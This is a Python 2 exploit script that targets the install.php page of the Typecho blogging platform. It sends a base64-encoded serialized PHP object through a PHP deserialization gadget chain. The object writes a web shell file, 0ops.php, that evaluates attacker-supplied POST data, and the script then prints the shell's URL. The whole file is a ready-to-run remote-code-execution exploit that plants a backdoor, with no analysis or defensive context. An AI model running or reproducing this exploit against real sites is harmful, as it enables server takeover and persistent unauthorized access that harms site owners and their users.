#!/usr/bin/python
#coding:utf-8
import requests
import sys
def judge_vuln(site_session,url):
	header = {'User-Agent':'Mozilla/4.0 (Macintosh; Intel Mac OS X 9_1_3) AppleWebKit/37.36 (KHTML, like Gecko) Chrome/1.0.3163.100 Safari/37.36'}
	url = url + "install.php"
	try:
		request = site_session.get(url).status_code
		if request != 200:
			return False
		else:
			return True
	except:
		print "[+]"+"    Website is not exist"
		sys.exit()

def get_shell(site_session,url):
	headers = {
	'User-Agent':'Mozilla/4.0 (Macintosh; Intel Mac OS X 9_1_3) AppleWebKit/37.36 (KHTML, like Gecko) Chrome/1.0.3163.100 Safari/37.36',
	'Referer':url + 'install.php',
	"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding":"gzip, deflate",
	}
	url = url + 'install.php?finish=1'
	post_data = {
		"__typecho_config":"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjYxOiJmaWxlX3B1dF9jb250ZW50cygnMG9wcy5waHAnLCAnPD9waHAgZXZhbCgkX1BPU1RbcG9zMl0pOz8+Jyk7Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjE6ImZpbGVfcHV0X2NvbnRlbnRzKCcwb3BzLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtwb3MyXSk7Pz4nKTsiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9"

	}
	shell = site_session.post(url = url, data = post_data, headers = headers ,timeout = 10 ,verify = False)



def main():
	print "[+]" + "    give me magic url:" +"   " + sys.argv[1]
	flag = False
	site_session = requests.Session()
	vuln_url = sys.argv[1]
	flag = judge_vuln(site_session,vuln_url)
	if flag:
		print "[+]" + "    Website may be vulnerable!"
		get_shell(site_session,vuln_url)
	else:
		print "[+]" + "    Website may be not suit this exp"
		sys.exit()
	print "[+]" + "    webshell url is " + sys.argv[1] + "0ops.php"
	print "[+]" + "    done,enjoy!"
if __name__ == '__main__':
	main()